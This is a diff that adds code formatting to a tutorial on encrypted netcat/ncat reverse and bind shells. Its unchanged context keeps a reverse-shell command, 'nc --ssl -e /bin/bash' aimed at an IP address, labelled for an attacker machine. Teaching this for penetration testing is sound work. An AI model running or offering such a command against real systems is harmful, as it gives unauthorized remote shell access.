@@ -265,7 +265,7 @@ When using ncat, some of these concerns are addressed as it allows for use of ss
 
 **Encrypted Shells**
 
-For a reverse shell we'll use the same command syntax but add --ssl to the command, same goes for bind shells.
+For a reverse shell we'll use the same command syntax but add `--ssl` to the command, same goes for bind shells.
 
 Server (attacker machine)
 
@@ -280,7 +280,7 @@ nc --ssl -e /bin/bash 192.168.125.10 8080
 
 **Access Control**
 
-When using netcat in server mode the --allow option can specify one host or network range to be allowed to connect to the port, this can be good 
+When using netcat in server mode the `--allow` option can specify one host or network range to be allowed to connect to the port, this can be good 
 for the bind shell situation. Similarly, you can use --deny to deny access from a specific host or network range.
 
 ```sh
